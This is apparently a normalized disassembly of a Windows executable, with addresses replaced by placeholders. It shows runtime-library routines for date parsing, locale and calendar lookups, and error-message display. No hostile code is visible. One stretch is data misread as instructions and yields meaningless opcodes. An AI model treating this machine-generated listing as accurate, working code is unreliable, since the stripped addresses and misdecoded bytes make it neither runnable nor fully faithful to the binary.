mov edi 0x1
jmp r-xdata
mov eax esi
call sub_4042c8
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a864
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_4042c8
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c3b8
mov [ ebx ] eax
jmp r-xdata
sub_40a8ac
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4044c8
push eax
mov eax [ ebx ]
call sub_4044c8
pop edx
call sub_40c42c
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a900
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409a88
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a95c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40ac77
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a818
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c3f4
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a6c0
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a864
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_404528
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407f30
mov eax [ ebp - 0x1c ]
call sub_40a8ac
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ac7e
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_40402c
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a7e0
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a6c0
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a7e0
test al al
je r-xdata
call sub_409a88
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a6c0
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_4096a8
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_40460c
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a7e0
mov edx ebx
mov eax esi
call sub_40a69c
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_4042c8
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a864
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a900
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a69c
mov eax esi
call sub_4042c8
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409a88
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_4042c8
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404528
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407ec0
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_4042c8
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404528
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407ec0
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40aca0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a754
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a754
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a754
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a6c0
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a69c
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a754
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a7e0
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a6c0
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a754
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a7e0
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a69c
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409560
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a754
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a6c0
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a754
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a7e0
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a754
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a6c0
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40ae94
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40a95c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4042c8
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40aec8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40aca0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4042c8
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40aefc
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a95c
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40aec8
mov ebx eax
jmp r-xdata
mov eax esi
call sub_4042c8
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40aca0
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40af88
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_4040f8
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40afd4
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_40405c
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_4040f8
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b020
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40b048
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40afd4
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405d38
sub_40b084
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b197
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40b048
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40405c
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40b048
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_40405c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40b048
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40405c
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40b048
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_40405c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b19e
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_40402c
retn
sub_40b1a8
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_404200
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b1e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b249
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404200
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_4081a8
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b250
lea eax [ ebp - 0x4 ]
call sub_404008
retn
inc ebx
sub_40b25c
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b2f3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40afd4
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_4081a8
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b2fa
lea eax [ ebp - 0x4 ]
call sub_404008
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b1a8
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b1e4
call EnumCalendarInfoA
sub_40b30c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b4d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_404008
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40afd4
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_4081a8
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_4042c8
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b4dd
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_40402c
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408778
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c37c
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_404528
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4042d0
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_40405c
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408778
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4042d0
inc ebx
jmp r-xdata
mov eax esi
call sub_4042c8
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408778
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4042d0
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4042d0
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4042d0
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_4041f0
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4042d0
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_4041f0
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_4042d0
sub_40b540
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b534
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c4cc
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_40869c
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4052a4
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_4031e0
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408cc0
mov eax [ ebp - 0x4 ]
call sub_408638
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_4044c8
mov ebx eax
mov eax ebx
call sub_408638
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b6c8
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b540
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4052a4
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402b30
call sub_402834
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408638
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b790
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40405c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_40b7cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b826
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408d00
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_40405c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b82d
lea eax [ ebp - 0x4 ]
call sub_404008
retn
add esp 0xfffffff0
call sub_4035dc
sub_40b82d
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_40b84c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405d38
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_40b888
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b8f4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405d38
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408d00
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_40405c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b8fb
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
add esp 0xfffffff0
call sub_4035dc
sub_40b8fb
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_40b948
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028a8
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40b9a8
lodsb [ esi ]
mov ecx 0xa0e0040
push esp
inc ebp
js r-xdata
cmp bh 0xff
pop ebx
retn
jo r-xdata
loopne r-xdata
push edx
je r-xdata
pop ebp
cld
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bab8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4040a0
jmp r-xdata
push ebx
mov eax edx
jmp sub_403a44
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40babf
lea eax [ ebp - 0x20 ]
call sub_404008
lea eax [ ebp - 0x4 ]
call sub_404008
retn
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b790
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b948
mov edx eax
sub_40ba1c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bab8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4040a0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
